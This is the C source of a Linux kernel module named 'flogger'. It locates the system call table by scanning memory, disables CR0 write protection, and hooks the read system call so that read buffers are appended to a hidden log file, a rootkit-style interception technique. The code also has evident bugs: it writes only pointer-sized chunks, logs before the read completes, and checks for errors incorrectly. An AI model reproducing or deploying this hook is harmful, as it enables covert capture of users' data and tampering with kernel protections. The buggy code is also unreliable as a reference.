#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>

unsigned long **sys_call_table;

asmlinkage size_t (*og_sys_read)(int filedes, void *buf, size_t bytes);

static void floglog(char *filename, char *data)
{
  struct file *file;
  loff_t pos = 0;

  mm_segment_t old_fs = get_fs();
  set_fs(KERNEL_DS);

  file = filp_open(filename, O_WRONLY|O_CREAT|O_APPEND, 0644);
  if (file) {
    vfs_write(file, data, sizeof(data), &pos);
  }
  filp_close(file, NULL);
  set_fs(old_fs);
}

asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
{
  char *flogf = "/var/flogfile.log";
  printk("flogger: read call\n");
  floglog(flogf, buf);
  return og_sys_read(filedes, buf, bytes);
}

static void dsbl_pg_prot(void)
{
  unsigned long pgval;
  printk("flogger: disablig page protection\n");
  asm volatile("mov %%cr0, %0" 
	       :"=r" (pgval));
  if (pgval & 0x00010000) {
    pgval &= ~0x00010000;
    asm volatile("mov %0,%%cr0"
		 :
		 : "r" (pgval));
  }
}

static void enbl_pg_prot(void)
{
  unsigned long pgval;
  printk("flogger: enabling page protection\n");
  asm volatile("mov %%cr0, %0" 
	       :"=r" (pgval));
  if (!(pgval & 0x00010000)) {
    pgval |= 0x00010000;
    asm volatile("mov %0,%%cr0"
		 :
		 : "r" (pgval));
  }
}

static unsigned long **get_sys_call_table(void)
{
  unsigned long **sct;
  unsigned long int offset = PAGE_OFFSET;

  while (offset < ULONG_MAX) {
    sct = (unsigned long **) offset;
    
    if (sct[__NR_close] == (unsigned long *) sys_close) {
      printk("flogger: found sys_call_table at %p\n", sct);
      return sct;
    }

    offset += sizeof(void *);
  }

  return NULL;
}

int init_module(void)
{
  sys_call_table = get_sys_call_table();
  if (sys_call_table == NULL)
    return -1;

  dsbl_pg_prot();
  og_sys_read = sys_call_table[__NR_read];
  sys_call_table[__NR_read] = flog_read;
  enbl_pg_prot();
  printk("it\'s flogging time!\n");
  return 0;
}

void cleanup_module(void)
{
  dsbl_pg_prot();
  sys_call_table[__NR_read] = og_sys_read;
  enbl_pg_prot();
  printk("done flogging!\n");
}

MODULE_LICENSE("GPL");
